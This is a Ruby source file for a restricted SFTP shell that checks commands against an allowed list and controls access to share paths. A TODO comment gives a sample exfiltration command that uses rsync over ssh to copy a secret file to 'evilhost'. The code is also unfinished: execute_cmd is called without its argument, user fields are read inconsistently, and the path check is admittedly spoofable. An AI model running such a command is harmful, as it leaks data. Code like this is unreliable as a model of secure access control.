require 'shellwords'

require_relative 'sftp_config'
require_relative 'sftp_api'
require_relative 'sftp_logger'

class SFTPShell

  class AccessDeniedError < StandardError; end
  class DisallowedCommandError < StandardError; end
  class InvalidSharePathError < StandardError; end

  attr_accessor :config, :user, :original_cmd, :cmd, :share_path, :share

  def initialize(user_id, original_cmd)
    @config = SFTPConfig.new.config
    @api = SFTPAPI.new
    @user = @api.get_user(user_id)
    @original_cmd = original_cmd
  end

  def exec
    $logger.info "Authenticated user #{user['name']}"
    puts "Welcome, #{user['name']}!"

    if @original_cmd.nil?
      false
    else
      parse_cmd
      verify_access
      execute_cmd
      true
    end

  rescue AccessDeniedError => ex
    $logger.warn "Access denied for user #{user['name']}: #{@original_cmd}"
    puts "sftp-shell: #{@original_cmd}: Access denied."
    false
  rescue DisallowedCommandError => ex
    $logger.warn "Command not allowed for user #{user['name']}: #{@original_cmd}"
    puts "sftp-shell: #{@cmd.first}: Command not allowed."
    false
  rescue InvalidSharePathError => ex
    $logger.warn "Invalid share path for user #{user['name']}: #{@original_cmd}"
    puts "sftp-shell: #{@original_cmd}: Invalid share path"
    false
  end

  def parse_cmd
    @cmd = Shellwords.shellwords @original_cmd

    raise DisallowedCommandError unless @config['allowed_cmds'].include? @cmd.first

    # TODO: prevent running rsync client (ssh sftp@myhost 'rsync files/SECRET user@evilhost:SECRET')
    # TODO: prevent spoofing share path
    @share_path = File.expand_path(File.join @config['storage_path'], @cmd.last)

    $logger.info "Accessing share path #{@share_path}"
  end

  def verify_access
    raise InvalidSharePathError unless @share_path.start_with? @config['storage_path']

    @share = @api.get_share @share_path
    raise InvalidSharePathError unless @share

    access = @api.check_access @share, @user
    raise AccessDeniedError unless access
  end

  def execute_cmd(args)
    env = {
      'HOME' => ENV['HOME'],
      'PATH' => ENV['PATH'],
      'LD_LIBRARY_PATH' => ENV['LD_LIBRARY_PATH'],
      'LANG' => ENV['LANG'],
      'SFTP_USER_NAME' => @user.name
    }

    Kernel::exec env, *args, :unsetenv_others => true
  end

end
